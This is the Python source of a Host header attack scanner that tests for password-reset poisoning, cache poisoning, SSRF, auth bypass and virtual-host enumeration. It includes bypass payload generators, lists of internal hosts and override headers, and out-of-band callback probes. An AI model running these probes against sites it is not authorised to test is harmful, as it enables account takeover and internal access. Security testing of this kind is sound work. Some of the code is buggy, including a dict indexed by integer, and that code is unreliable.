"""
PHANTOM AI - HTTP Host Header Attack Scanner

Enterprise-grade Host header vulnerability detection covering:
- Password reset poisoning
- Web cache poisoning via Host header
- SSRF through Host header manipulation
- Routing-based SSRF
- Host header authentication bypass
- Virtual host enumeration
- Absolute URL in request line
- Duplicate Host headers
- X-Forwarded-Host injection
- Host override headers
- Connection state attacks

Based on PortSwigger Web Security Academy - HTTP Host Header Attacks (7 labs)

Version: 3.0.0
Author: PHANTOM AI Team
"""

from __future__ import annotations

import asyncio
import logging
import re
import uuid
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)


# =============================================================================
# CONSTANTS & CONFIGURATIONS
# =============================================================================

VERSION = "3.0.0"


class HostVulnType(Enum):
    """Types of Host header vulnerabilities."""

    PASSWORD_RESET_POISONING = auto()   # Hijack password reset links
    WEB_CACHE_POISONING = auto()        # Poison cache via Host
    SSRF_VIA_HOST = auto()              # SSRF through Host manipulation
    ROUTING_BASED_SSRF = auto()         # Backend routing exploitation
    AUTH_BYPASS = auto()                # Authentication bypass
    VIRTUAL_HOST_BRUTE = auto()         # Virtual host enumeration
    HOST_VALIDATION_BYPASS = auto()     # Whitelist bypass
    DANGLING_MARKUP = auto()            # Dangling markup injection
    CONNECTION_STATE = auto()           # Connection state attack
    HOST_HEADER_INJECTION = auto()      # Generic Host injection
    INTERNAL_ACCESS = auto()            # Access internal systems


class InjectionVector(Enum):
    """Host header injection vectors."""

    HOST_HEADER = auto()                # Direct Host header
    X_FORWARDED_HOST = auto()           # X-Forwarded-Host
    X_HOST = auto()                     # X-Host
    X_FORWARDED_SERVER = auto()         # X-Forwarded-Server
    X_HTTP_HOST_OVERRIDE = auto()       # X-HTTP-Host-Override
    FORWARDED = auto()                  # RFC 7239 Forwarded header
    X_ORIGINAL_URL = auto()             # X-Original-URL
    X_REWRITE_URL = auto()              # X-Rewrite-URL
    ABSOLUTE_URL = auto()               # Absolute URL in request line
    DUPLICATE_HOST = auto()             # Duplicate Host headers
    HOST_OVERRIDE = auto()              # Various override headers
    VIA_HEADER = auto()                 # Via header manipulation


# Override headers to test
HOST_OVERRIDE_HEADERS = [
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-HTTP-Host-Override",
    "Forwarded",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-Original-Host",
    "X-Proxy-Host",
    "X-Remote-Host",
    "X-Custom-IP-Authorization",
    "X-Real-IP",
    "True-Client-IP",
    "Cluster-Client-IP",
    "X-ProxyUser-Ip",
    "Client-IP",
    "X-Client-IP",
    "X-Originating-IP",
]

# Common internal hosts to try
INTERNAL_HOSTS = [
    "localhost",
    "127.0.0.1",
    "127.1",
    "0.0.0.0",
    "0",
    "[::1]",
    "[::ffff:127.0.0.1]",
    "localhost:80",
    "localhost:443",
    "localhost:8080",
    "localhost:8443",
    "internal",
    "internal.local",
    "admin.local",
    "backend",
    "api-internal",
    "192.168.0.1",
    "192.168.1.1",
    "10.0.0.1",
    "172.16.0.1",
]

# Collaborator-like detection hosts
CANARY_HOSTS = [
    "burpcollaborator.net",
    "oastify.com",
    "interact.sh",
    "canarytokens.com",
]


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class HostEndpoint:
    """Endpoint information for Host header testing."""

    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    body: Optional[str] = None
    is_password_reset: bool = False
    is_cacheable: bool = False
    requires_auth: bool = False
    original_host: str = ""

    def __post_init__(self):
        if not self.original_host:
            parsed = urlparse(self.url)
            self.original_host = parsed.netloc


@dataclass
class HostTestResult:
    """Result of a Host header test."""

    endpoint: HostEndpoint
    injection_vector: InjectionVector
    injected_value: str
    response_code: int
    response_body: str
    response_headers: Dict[str, str]
    reflected_in_body: bool
    reflected_in_headers: bool
    reflected_in_location: bool
    caused_error: bool
    cache_hit: bool
    evidence: Dict[str, Any]


@dataclass
class HostFinding:
    """Host header vulnerability finding."""

    id: str
    vuln_type: HostVulnType
    severity: str
    confidence: float
    endpoint: HostEndpoint
    injection_vector: InjectionVector
    injected_value: str
    description: str
    impact: str
    remediation: str
    evidence: Dict[str, Any]
    cwe_id: int
    cvss_score: float
    request_example: str
    response_evidence: str


@dataclass
class ScanConfig:
    """Host header scanner configuration."""

    target_url: str
    timeout: float = 30.0
    test_password_reset: bool = True
    test_cache_poisoning: bool = True
    test_ssrf: bool = True
    test_auth_bypass: bool = True
    test_vhost_enum: bool = True
    collaborator_domain: Optional[str] = None
    custom_internal_hosts: List[str] = field(default_factory=list)
    follow_redirects: bool = False
    max_vhosts_to_test: int = 100
    safe_mode: bool = True


# =============================================================================
# HOST MANIPULATION UTILITIES
# =============================================================================

class HostManipulator:
    """Utilities for manipulating Host headers."""

    VERSION = "3.0.0"

    @staticmethod
    def inject_port(host: str, port: int) -> str:
        """Inject a port into a hostname."""
        if ":" in host:
            return host.split(":")[0] + f":{port}"
        return f"{host}:{port}"

    @staticmethod
    def inject_subdomain(host: str, subdomain: str) -> str:
        """Inject a subdomain prefix."""
        return f"{subdomain}.{host}"

    @staticmethod
    def wrap_brackets(host: str) -> str:
        """Wrap in brackets for ambiguous parsing."""
        return f"[{host}]"

    @staticmethod
    def add_whitespace(host: str) -> List[str]:
        """Generate whitespace variations."""
        return [
            f" {host}",
            f"{host} ",
            f" {host} ",
            f"\t{host}",
            f"{host}\t",
            f"\n{host}",
            f"{host}\n",
        ]

    @staticmethod
    def case_variations(host: str) -> List[str]:
        """Generate case variations."""
        return [
            host.upper(),
            host.lower(),
            host.title(),
            host.swapcase(),
        ]

    @staticmethod
    def generate_bypass_hosts(original: str, evil: str) -> List[str]:
        """Generate Host header bypass variations."""
        bypasses = [
            evil,
            f"{evil}#{original}",
            f"{evil}%23{original}",
            f"{evil}@{original}",
            f"{evil}%40{original}",
            f"{original}@{evil}",
            f"{original}#{evil}",
            f"{evil}?.{original}",
            f"{evil}/{original}",
            f"{evil}\\{original}",
            f"{evil}%5c{original}",
            f"{evil}.{original}",
            f"{original}.{evil}",
            f"{evil}:{original}",
            f"{evil}&{original}",
            f"{evil}|{original}",
        ]
        return bypasses

    @staticmethod
    def generate_internal_bypass(original: str, internal: str) -> List[str]:
        """Generate internal host access bypasses."""
        return [
            internal,
            f"{internal}#{original}",
            f"{internal}.{original}",
            f"{original}@{internal}",
            f"foo@{internal}",
            f"foo:bar@{internal}",
        ]


# =============================================================================
# PASSWORD RESET POISONING
# =============================================================================

class PasswordResetPoisoner:
    """
    Test for password reset poisoning vulnerabilities.

    Attack flow:
    1. Submit password reset for victim email
    2. Inject attacker-controlled Host header
    3. Victim receives reset link with attacker's domain
    4. Victim clicks link, attacker captures token
    """

    VERSION = "3.0.0"

    # Common password reset endpoint patterns
    RESET_PATTERNS = [
        "/forgot-password",
        "/password/reset",
        "/reset-password",
        "/forgot",
        "/recover",
        "/password/forgot",
        "/account/forgot-password",
        "/auth/forgot-password",
        "/api/forgot-password",
        "/api/password/reset",
        "/users/password/new",
        "/user/forgot-password",
    ]

    # Common email parameter names
    EMAIL_PARAMS = [
        "email",
        "username",
        "user",
        "login",
        "user_email",
        "userEmail",
        "account",
        "id",
        "user_id",
    ]

    def __init__(self, http_client: Any = None):
        """Initialize poisoner."""
        self.http_client = http_client
        self.manipulator = HostManipulator()

    async def find_reset_endpoint(self, base_url: str) -> Optional[HostEndpoint]:
        """Find password reset endpoint."""
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for pattern in self.RESET_PATTERNS:
            url = urljoin(base, pattern)
            try:
                if self.http_client:
                    response = await self.http_client.get(url, timeout=10.0)
                    if response.status_code in [200, 405]:  # 405 = method not allowed (needs POST)
                        return HostEndpoint(
                            url=url,
                            method="POST",
                            is_password_reset=True,
                        )
            except Exception:
                pass

        return None

    async def test_poisoning(
        self,
        endpoint: HostEndpoint,
        test_email: str,
        evil_host: str,
    ) -> List[HostTestResult]:
        """Test password reset poisoning with various techniques."""
        results = []

        # Build base request body
        body = None
        content_type = "application/x-www-form-urlencoded"
        for param in self.EMAIL_PARAMS:
            body = f"{param}={test_email}"

        # Test techniques
        techniques = [
            # Direct Host replacement
            (InjectionVector.HOST_HEADER, {"Host": evil_host}),

            # X-Forwarded-Host
            (InjectionVector.X_FORWARDED_HOST, {"X-Forwarded-Host": evil_host}),

            # Duplicate Host headers
            (InjectionVector.DUPLICATE_HOST, {"Host": [endpoint.original_host, evil_host]}),

            # Various override headers
            (InjectionVector.X_HOST, {"X-Host": evil_host}),
            (InjectionVector.X_FORWARDED_SERVER, {"X-Forwarded-Server": evil_host}),

            # RFC 7239 Forwarded
            (InjectionVector.FORWARDED, {"Forwarded": f"host={evil_host}"}),
        ]

        for vector, headers in techniques:
            result = await self._send_test_request(
                endpoint, vector, evil_host, headers, body, content_type
            )
            results.append(result)

            # If we find reflection, test bypass variations
            if result.reflected_in_body or result.reflected_in_headers:
                bypass_hosts = self.manipulator.generate_bypass_hosts(
                    endpoint.original_host, evil_host
                )
                for bypass in bypass_hosts[:5]:
                    headers_copy = dict(headers)
                    for i_key, key in enumerate(headers_copy):
                        if headers_copy[i_key] == evil_host:
                            headers_copy[i_key] = bypass
                    bypass_result = await self._send_test_request(
                        endpoint, vector, bypass, headers_copy, body, content_type
                    )
                    results.append(bypass_result)

        return results

    async def _send_test_request(
        self,
        endpoint: HostEndpoint,
        vector: InjectionVector,
        injected_value: str,
        headers: Dict[str, Any],
        body: Optional[str],
        content_type: str,
    ) -> HostTestResult:
        """Send a test request and analyze response."""
        all_headers = dict(endpoint.headers)
        all_headers["Content-Type"] = content_type

        # Handle special headers
        for key, value in headers.items():
            if isinstance(value, list):
                # Duplicate headers - some clients don't support this
                all_headers[key] = value[-1]  # Use last value
            else:
                all_headers[key] = value

        response_code = 0
        response_body = ""
        response_headers = {}

        try:
            if self.http_client:
                response = await self.http_client.request(
                    method=endpoint.method,
                    url=endpoint.url,
                    headers=all_headers,
                    data=body,
                    allow_redirects=False,
                )
                response_code = response.status_code
                response_body = response.text if hasattr(response, 'text') else str(response.content)
                response_headers = dict(response.headers) if hasattr(response, 'headers') else {}
            else:
                # Simulation
                response_code = 200
                response_body = f"Reset link: https://{injected_value}/reset?token=abc123"

        except Exception as e:
            logger.debug(f"[HostHeader] Request failed: {e}")

        # Analyze response
        reflected_in_body = injected_value.lower() in response_body.lower()
        reflected_in_headers = any(
            injected_value.lower() in str(v).lower()
            for v in response_headers.values()
        )
        reflected_in_location = injected_value.lower() in response_headers.get("Location", "").lower()

        return HostTestResult(
            endpoint=endpoint,
            injection_vector=vector,
            injected_value=injected_value,
            response_code=response_code,
            response_body=response_body,
            response_headers=response_headers,
            reflected_in_body=reflected_in_body,
            reflected_in_headers=reflected_in_headers,
            reflected_in_location=reflected_in_location,
            caused_error=response_code >= 500,
            cache_hit="HIT" in response_headers.get("X-Cache", ""),
            evidence={
                "vector": vector.name,
                "injected": injected_value,
                "reflected": reflected_in_body or reflected_in_headers,
            },
        )


# =============================================================================
# CACHE POISONING VIA HOST
# =============================================================================

class HostCachePoisoner:
    """
    Test for web cache poisoning via Host header manipulation.

    Attack flow:
    1. Send request with malicious Host header
    2. If response is cached with poisoned content
    3. Subsequent users receive poisoned response
    """

    VERSION = "3.0.0"

    CACHE_HEADERS = [
        "X-Cache",
        "X-Cache-Hit",
        "CF-Cache-Status",
        "Age",
        "Cache-Control",
        "X-Varnish",
        "X-Drupal-Cache",
        "X-Proxy-Cache",
    ]

    def __init__(self, http_client: Any = None):
        """Initialize cache poisoner."""
        self.http_client = http_client
        self.manipulator = HostManipulator()

    async def test_cache_poisoning(
        self,
        endpoint: HostEndpoint,
        evil_host: str,
    ) -> List[HostTestResult]:
        """Test cache poisoning via Host header."""
        results = []

        # Add cache buster to ensure we get fresh responses
        cache_buster = f"?cb={uuid.uuid4().hex[:8]}"
        test_url = endpoint.url + cache_buster

        test_endpoint = HostEndpoint(
            url=test_url,
            method="GET",
            is_cacheable=True,
            original_host=endpoint.original_host,
        )

        # Test various vectors
        vectors = [
            (InjectionVector.HOST_HEADER, {"Host": evil_host}),
            (InjectionVector.X_FORWARDED_HOST, {"X-Forwarded-Host": evil_host}),
            (InjectionVector.X_HOST, {"X-Host": evil_host}),
            (InjectionVector.FORWARDED, {"Forwarded": f"host={evil_host}"}),
        ]

        for vector, headers in vectors:
            # First request - potentially poison the cache
            result1 = await self._send_cache_test(test_endpoint, vector, evil_host, headers)
            results.append(result1)

            if result1.reflected_in_body:
                # Second request - check if cache was poisoned
                await asyncio.sleep(0.5)
                result2 = await self._send_normal_request(test_endpoint)

                if evil_host.lower() in result2.response_body.lower():
                    result1.evidence["cache_poisoned"] = True
                    result1.cache_hit = True

        return results

    async def _send_cache_test(
        self,
        endpoint: HostEndpoint,
        vector: InjectionVector,
        injected_value: str,
        headers: Dict[str, str],
    ) -> HostTestResult:
        """Send request to potentially poison cache."""
        all_headers = dict(endpoint.headers)
        all_headers.update(headers)

        response_code = 0
        response_body = ""
        response_headers = {}

        try:
            if self.http_client:
                response = await self.http_client.get(
                    endpoint.url,
                    headers=all_headers,
                )
                response_code = response.status_code
                response_body = response.text if hasattr(response, 'text') else str(response.content)
                response_headers = dict(response.headers) if hasattr(response, 'headers') else {}
            else:
                response_code = 200
                response_body = f'<a href="https://{injected_value}/path">Link</a>'

        except Exception as e:
            logger.debug(f"[HostHeader] Cache test failed: {e}")

        reflected_in_body = injected_value.lower() in response_body.lower()

        # Check for cache indicators
        cache_hit = False
        for header in self.CACHE_HEADERS:
            if header in response_headers:
                if "HIT" in response_headers[header].upper():
                    cache_hit = True
                    break

        return HostTestResult(
            endpoint=endpoint,
            injection_vector=vector,
            injected_value=injected_value,
            response_code=response_code,
            response_body=response_body,
            response_headers=response_headers,
            reflected_in_body=reflected_in_body,
            reflected_in_headers=False,
            reflected_in_location=False,
            caused_error=response_code >= 500,
            cache_hit=cache_hit,
            evidence={"cache_headers": {h: response_headers.get(h) for h in self.CACHE_HEADERS if h in response_headers}},
        )

    async def _send_normal_request(self, endpoint: HostEndpoint) -> HostTestResult:
        """Send normal request to check cache state."""
        response_code = 0
        response_body = ""
        response_headers = {}

        try:
            if self.http_client:
                response = await self.http_client.get(endpoint.url)
                response_code = response.status_code
                response_body = response.text if hasattr(response, 'text') else str(response.content)
                response_headers = dict(response.headers) if hasattr(response, 'headers') else {}
        except Exception:
            pass

        return HostTestResult(
            endpoint=endpoint,
            injection_vector=InjectionVector.HOST_HEADER,
            injected_value="",
            response_code=response_code,
            response_body=response_body,
            response_headers=response_headers,
            reflected_in_body=False,
            reflected_in_headers=False,
            reflected_in_location=False,
            caused_error=False,
            cache_hit=False,
            evidence={},
        )


# =============================================================================
# SSRF VIA HOST HEADER
# =============================================================================

class HostSSRFTester:
    """
    Test for SSRF vulnerabilities via Host header manipulation.

    Scenarios:
    1. Backend makes request using Host header value
    2. Routing based on Host header reaches internal services
    3. Host header used in URL construction for internal requests
    """

    VERSION = "3.0.0"

    def __init__(self, http_client: Any = None):
        """Initialize SSRF tester."""
        self.http_client = http_client
        self.manipulator = HostManipulator()

    async def test_ssrf(
        self,
        endpoint: HostEndpoint,
        collaborator_domain: Optional[str] = None,
    ) -> List[HostTestResult]:
        """Test SSRF via Host header."""
        results = []

        # Test internal hosts
        for internal in INTERNAL_HOSTS:
            result = await self._test_internal_access(endpoint, internal)
            results.append(result)

            # If we get different response, might indicate internal access
            if result.response_code != 404 and not result.caused_error:
                # Try more bypass variations
                bypasses = self.manipulator.generate_internal_bypass(
                    endpoint.original_host, internal
                )
                for bypass in bypasses[:3]:
                    bypass_result = await self._test_internal_access(endpoint, bypass)
                    results.append(bypass_result)

        # Test with collaborator domain if provided
        if collaborator_domain:
            collab_result = await self._test_oob_ssrf(endpoint, collaborator_domain)
            results.append(collab_result)

        return results

    async def _test_internal_access(
        self,
        endpoint: HostEndpoint,
        internal_host: str,
    ) -> HostTestResult:
        """Test if we can access internal host via Host header."""
        vectors = [
            (InjectionVector.HOST_HEADER, {"Host": internal_host}),
            (InjectionVector.X_FORWARDED_HOST, {"X-Forwarded-Host": internal_host}),
            (InjectionVector.ABSOLUTE_URL, {}),  # Absolute URL in request line
        ]

        # Use first vector for this test
        vector, headers = vectors[0]

        all_headers = dict(endpoint.headers)
        all_headers.update(headers)

        response_code = 0
        response_body = ""
        response_headers = {}

        try:
            if self.http_client:
                response = await self.http_client.request(
                    method=endpoint.method,
                    url=endpoint.url,
                    headers=all_headers,
                )
                response_code = response.status_code
                response_body = response.text if hasattr(response, 'text') else str(response.content)
                response_headers = dict(response.headers) if hasattr(response, 'headers') else {}
            else:
                # Simulation - some internal hosts return different content
                if internal_host in ["localhost", "127.0.0.1"]:
                    response_code = 200
                    response_body = "Internal admin panel"
                else:
                    response_code = 404

        except Exception as e:
            logger.debug(f"[HostHeader] SSRF test failed: {e}")

        # Check for indicators of internal access
        internal_indicators = [
            "admin", "internal", "dashboard", "config", "settings",
            "debug", "management", "api-docs", "swagger",
        ]
        internal_access = any(ind in response_body.lower() for ind in internal_indicators)

        return HostTestResult(
            endpoint=endpoint,
            injection_vector=vector,
            injected_value=internal_host,
            response_code=response_code,
            response_body=response_body[:2000],  # Truncate
            response_headers=response_headers,
            reflected_in_body=internal_host in response_body,
            reflected_in_headers=False,
            reflected_in_location=False,
            caused_error=response_code >= 500,
            cache_hit=False,
            evidence={
                "internal_access": internal_access,
                "response_size": len(response_body),
            },
        )

    async def _test_oob_ssrf(
        self,
        endpoint: HostEndpoint,
        collaborator: str,
    ) -> HostTestResult:
        """Test out-of-band SSRF using collaborator domain."""
        unique_id = uuid.uuid4().hex[:8]
        oob_host = f"{unique_id}.{collaborator}"

        all_headers = dict(endpoint.headers)
        all_headers["Host"] = oob_host

        response_code = 0
        response_body = ""
        response_headers = {}

        try:
            if self.http_client:
                response = await self.http_client.request(
                    method=endpoint.method,
                    url=endpoint.url,
                    headers=all_headers,
                )
                response_code = response.status_code
                response_body = response.text if hasattr(response, 'text') else ""
                response_headers = dict(response.headers) if hasattr(response, 'headers') else {}
        except Exception:
            pass

        return HostTestResult(
            endpoint=endpoint,
            injection_vector=InjectionVector.HOST_HEADER,
            injected_value=oob_host,
            response_code=response_code,
            response_body=response_body[:1000],
            response_headers=response_headers,
            reflected_in_body=False,
            reflected_in_headers=False,
            reflected_in_location=False,
            caused_error=False,
            cache_hit=False,
            evidence={
                "oob_host": oob_host,
                "check_collaborator": f"Check {collaborator} for DNS/HTTP callback from {unique_id}",
            },
        )


# =============================================================================
# VIRTUAL HOST ENUMERATION
# =============================================================================

class VirtualHostEnumerator:
    """
    Enumerate virtual hosts via Host header manipulation.

    Technique:
    1. Send requests with different Host header values
    2. Compare responses to detect different virtual hosts
    3. Identify hidden/internal virtual hosts
    """

    VERSION = "3.0.0"

    # Common vhost prefixes to try
    VHOST_PREFIXES = [
        "admin", "administrator", "api", "api-internal", "backend",
        "beta", "cms", "console", "control", "cp", "cpanel",
        "dashboard", "dev", "development", "devops", "git",
        "gitlab", "grafana", "internal", "intranet", "jenkins",
        "jira", "kibana", "legacy", "local", "localhost",
        "mail", "management", "manager", "monitor", "monitoring",
        "old", "panel", "portal", "private", "prod", "production",
        "proxy", "qa", "secure", "server", "stage", "staging",
        "status", "support", "sys", "sysadmin", "test", "testing",
        "tools", "uat", "vpn", "web", "webmail", "www2",
    ]

    def __init__(self, http_client: Any = None):
        """Initialize enumerator."""
        self.http_client = http_client
        self.baseline_response: Optional[HostTestResult] = None

    async def enumerate(
        self,
        base_host: str,
        base_url: str,
        custom_wordlist: Optional[List[str]] = None,
        max_tests: int = 100,
    ) -> List[Tuple[str, HostTestResult]]:
        """
        Enumerate virtual hosts.

        Args:
            base_host: Original hostname
            base_url: URL to test
            custom_wordlist: Custom vhost prefixes
            max_tests: Maximum number of vhosts to test

        Returns:
            List of (vhost, result) tuples for discovered vhosts
        """
        # Get baseline response
        self.baseline_response = await self._get_baseline(base_url)

        # Build wordlist
        wordlist = custom_wordlist or self.VHOST_PREFIXES
        wordlist = wordlist[:max_tests]

        discovered = []

        for prefix in wordlist:
            vhost = f"{prefix}.{base_host}"
            result = await self._test_vhost(base_url, vhost)

            # Check if response differs from baseline (potential different vhost)
            if self._is_different_vhost(result):
                discovered.append((vhost, result))
                logger.info(f"[HostHeader] Discovered vhost: {vhost}")

        return discovered

    async def _get_baseline(self, url: str) -> HostTestResult:
        """Get baseline response for comparison."""
        response_code = 0
        response_body = ""
        response_headers = {}

        try:
            if self.http_client:
                response = await self.http_client.get(url)
                response_code = response.status_code
                response_body = response.text if hasattr(response, 'text') else str(response.content)
                response_headers = dict(response.headers) if hasattr(response, 'headers') else {}
            else:
                response_code = 200
                response_body = "Default response"

        except Exception:
            pass

        return HostTestResult(
            endpoint=HostEndpoint(url=url),
            injection_vector=InjectionVector.HOST_HEADER,
            injected_value="baseline",
            response_code=response_code,
            response_body=response_body,
            response_headers=response_headers,
            reflected_in_body=False,
            reflected_in_headers=False,
            reflected_in_location=False,
            caused_error=False,
            cache_hit=False,
            evidence={},
        )

    async def _test_vhost(self, url: str, vhost: str) -> HostTestResult:
        """Test a specific virtual host."""
        headers = {"Host": vhost}

        response_code = 0
        response_body = ""
        response_headers = {}

        try:
            if self.http_client:
                response = await self.http_client.get(url, headers=headers)
                response_code = response.status_code
                response_body = response.text if hasattr(response, 'text') else str(response.content)
                response_headers = dict(response.headers) if hasattr(response, 'headers') else {}
            else:
                # Simulation - some vhosts return different content
                if "admin" in vhost:
                    response_code = 200
                    response_body = "Admin panel - Login required"
                else:
                    response_code = 200
                    response_body = "Default response"

        except Exception:
            pass

        return HostTestResult(
            endpoint=HostEndpoint(url=url),
            injection_vector=InjectionVector.HOST_HEADER,
            injected_value=vhost,
            response_code=response_code,
            response_body=response_body,
            response_headers=response_headers,
            reflected_in_body=vhost in response_body,
            reflected_in_headers=False,
            reflected_in_location=False,
            caused_error=response_code >= 500,
            cache_hit=False,
            evidence={"content_length": len(response_body)},
        )

    def _is_different_vhost(self, result: HostTestResult) -> bool:
        """Check if result indicates a different virtual host."""
        if not self.baseline_response:
            return False

        baseline = self.baseline_response

        # Different status code (but not error)
        if result.response_code != baseline.response_code and result.response_code < 500:
            return True

        # Significantly different content length
        baseline_len = len(baseline.response_body)
        result_len = len(result.response_body)
        if baseline_len > 0:
            diff_ratio = abs(result_len - baseline_len) / baseline_len
            if diff_ratio > 0.3:  # 30% different
                return True

        # Different title or key content
        baseline_title = re.search(r'<title>([^<]+)</title>', baseline.response_body, re.I)
        result_title = re.search(r'<title>([^<]+)</title>', result.response_body, re.I)
        if baseline_title and result_title:
            if baseline_title.group(1) != result_title.group(1):
                return True

        return False


# =============================================================================
# MAIN SCANNER CLASS
# =============================================================================

class HostHeaderScanner:
    """
    Enterprise-grade HTTP Host header vulnerability scanner.

    Detects:
    - Password reset poisoning
    - Web cache poisoning via Host
    - SSRF through Host header
    - Routing-based SSRF
    - Authentication bypass
    - Virtual host enumeration
    - Host validation bypass
    - Connection state attacks

    Usage:
        scanner = HostHeaderScanner()
        findings = await scanner.scan("https://target.com")
    """

    VERSION = "3.0.0"
    CWE_ID = 644  # CWE-644: Improper Neutralization of HTTP Headers for Scripting Syntax

    def __init__(
        self,
        http_client: Any = None,
        config: Optional[ScanConfig] = None,
    ):
        """Initialize the scanner."""
        self.http_client = http_client
        self.config = config
        self.reset_poisoner = PasswordResetPoisoner(http_client)
        self.cache_poisoner = HostCachePoisoner(http_client)
        self.ssrf_tester = HostSSRFTester(http_client)
        self.vhost_enumerator = VirtualHostEnumerator(http_client)
        self.manipulator = HostManipulator()
        self.findings: List[HostFinding] = []
        self._session_id = str(uuid.uuid4())[:8]

    async def scan(
        self,
        target_url: str,
        asset_data: Optional[Dict[str, Any]] = None,
        rate_limiter: Any = None,
        endpoints: Optional[List[HostEndpoint]] = None,
        **kwargs,
    ) -> List[HostFinding]:
        """
        Scan for Host header vulnerabilities.

        Args:
            target_url: Target URL to scan
            asset_data: Asset data with endpoints (optional)
            rate_limiter: Rate limiter (optional)
            endpoints: Pre-configured endpoints (optional)
            **kwargs: Additional configuration

        Returns:
            List of discovered vulnerabilities
        """
        logger.info(f"[HostHeader] Starting scan: {target_url}")

        # FIX: Store rate limiter for use in HTTP requests
        self._rate_limiter = rate_limiter

        # Create config if not provided
        if not self.config:
            self.config = ScanConfig(target_url=target_url)

        parsed = urlparse(target_url)
        base_host = parsed.netloc

        # Create default endpoint
        if not endpoints:
            endpoints = [HostEndpoint(url=target_url, original_host=base_host)]

        # Generate evil host for testing
        evil_host = f"evil-{self._session_id}.example.com"

        logger.info(f"[HostHeader] Testing {len(endpoints)} endpoint(s)")

        # Test password reset poisoning
        if self.config.test_password_reset:
            await self._test_password_reset(base_host, evil_host)

        # Test cache poisoning
        if self.config.test_cache_poisoning:
            for endpoint in endpoints:
                await self._test_cache_poisoning(endpoint, evil_host)

        # Test SSRF
        if self.config.test_ssrf:
            for endpoint in endpoints:
                await self._test_ssrf(endpoint)

        # Test auth bypass
        if self.config.test_auth_bypass:
            for endpoint in endpoints:
                await self._test_auth_bypass(endpoint)

        # Enumerate virtual hosts
        if self.config.test_vhost_enum:
            await self._enumerate_vhosts(base_host, target_url)

        # Test generic Host header injection
        for endpoint in endpoints:
            await self._test_host_injection(endpoint, evil_host)

        logger.info(f"[HostHeader] Scan complete. Found {len(self.findings)} vulnerabilities")
        return self.findings

    async def _acquire_rate_limit(self) -> None:
        """Acquire rate limit before making HTTP request."""
        if hasattr(self, '_rate_limiter') and self._rate_limiter:
            try:
                await self._rate_limiter.acquire()
            except Exception:
                pass  # Proceed if rate limiter fails

    async def _test_password_reset(self, base_host: str, evil_host: str) -> None:
        """Test for password reset poisoning."""
        logger.debug("[HostHeader] Testing password reset poisoning")

        # Find reset endpoint
        parsed = urlparse(self.config.target_url if self.config else f"https://{base_host}")
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        reset_endpoint = await self.reset_poisoner.find_reset_endpoint(base_url)
        if not reset_endpoint:
            logger.debug("[HostHeader] No password reset endpoint found")
            return

        # Test poisoning with a safe test email
        test_email = f"test-{self._session_id}@example.com"
        results = await self.reset_poisoner.test_poisoning(
            reset_endpoint, test_email, evil_host
        )

        for result in results:
            if result.reflected_in_body or result.reflected_in_location:
                self._create_finding(
                    vuln_type=HostVulnType.PASSWORD_RESET_POISONING,
                    severity="HIGH",
                    confidence=0.90 if result.reflected_in_location else 0.75,
                    endpoint=reset_endpoint,
                    injection_vector=result.injection_vector,
                    injected_value=result.injected_value,
                    description="Password reset link can be poisoned with attacker-controlled domain. "
                               "The injected Host header value appears in the password reset email/link.",
                    impact="Attackers can hijack password reset tokens and gain unauthorized account access.",
                    evidence=result.evidence,
                    response_evidence=result.response_body[:500],
                )
                return  # One finding is enough

    async def _test_cache_poisoning(self, endpoint: HostEndpoint, evil_host: str) -> None:
        """Test for cache poisoning via Host header."""
        logger.debug(f"[HostHeader] Testing cache poisoning: {endpoint.url}")

        results = await self.cache_poisoner.test_cache_poisoning(endpoint, evil_host)

        for result in results:
            if result.reflected_in_body and result.cache_hit:
                self._create_finding(
                    vuln_type=HostVulnType.WEB_CACHE_POISONING,
                    severity="HIGH",
                    confidence=0.85,
                    endpoint=endpoint,
                    injection_vector=result.injection_vector,
                    injected_value=result.injected_value,
                    description="Web cache can be poisoned via Host header manipulation. "
                               "Cached responses contain attacker-controlled content.",
                    impact="Attackers can serve malicious content to all users via poisoned cache.",
                    evidence=result.evidence,
                    response_evidence=result.response_body[:500],
                )
                return

    async def _test_ssrf(self, endpoint: HostEndpoint) -> None:
        """Test for SSRF via Host header."""
        logger.debug(f"[HostHeader] Testing SSRF: {endpoint.url}")

        collaborator = self.config.collaborator_domain if self.config else None
        results = await self.ssrf_tester.test_ssrf(endpoint, collaborator)

        for result in results:
            if result.evidence.get("internal_access"):
                self._create_finding(
                    vuln_type=HostVulnType.SSRF_VIA_HOST,
                    severity="HIGH",
                    confidence=0.80,
                    endpoint=endpoint,
                    injection_vector=result.injection_vector,
                    injected_value=result.injected_value,
                    description="SSRF vulnerability via Host header. Internal systems "
                               f"accessible by injecting: {result.injected_value}",
                    impact="Attackers can access internal services, admin panels, or sensitive data.",
                    evidence=result.evidence,
                    response_evidence=result.response_body[:500],
                )

    async def _test_auth_bypass(self, endpoint: HostEndpoint) -> None:
        """Test for authentication bypass via Host header."""
        logger.debug(f"[HostHeader] Testing auth bypass: {endpoint.url}")

        # Try localhost/internal hosts that might bypass auth
        bypass_hosts = ["localhost", "127.0.0.1", "internal", "admin.internal"]

        for host in bypass_hosts:
            headers = {"Host": host}

            try:
                if self.http_client:
                    await self._acquire_rate_limit()  # FIX: Rate limit before request
                    response = await self.http_client.get(
                        endpoint.url,
                        headers=headers,
                    )

                    # Check for auth bypass indicators
                    auth_bypass_indicators = [
                        response.status_code == 200 and "login" not in response.text.lower(),
                        "admin" in response.text.lower() and "dashboard" in response.text.lower(),
                        "welcome" in response.text.lower(),
                    ]

                    if any(auth_bypass_indicators):
                        self._create_finding(
                            vuln_type=HostVulnType.AUTH_BYPASS,
                            severity="CRITICAL",
                            confidence=0.70,
                            endpoint=endpoint,
                            injection_vector=InjectionVector.HOST_HEADER,
                            injected_value=host,
                            description=f"Authentication bypass possible using Host: {host}",
                            impact="Attackers can bypass authentication and access protected resources.",
                            evidence={"status_code": response.status_code},
                            response_evidence=response.text[:500] if hasattr(response, 'text') else "",
                        )
                        return

            except Exception:
                pass

    async def _enumerate_vhosts(self, base_host: str, base_url: str) -> None:
        """Enumerate virtual hosts."""
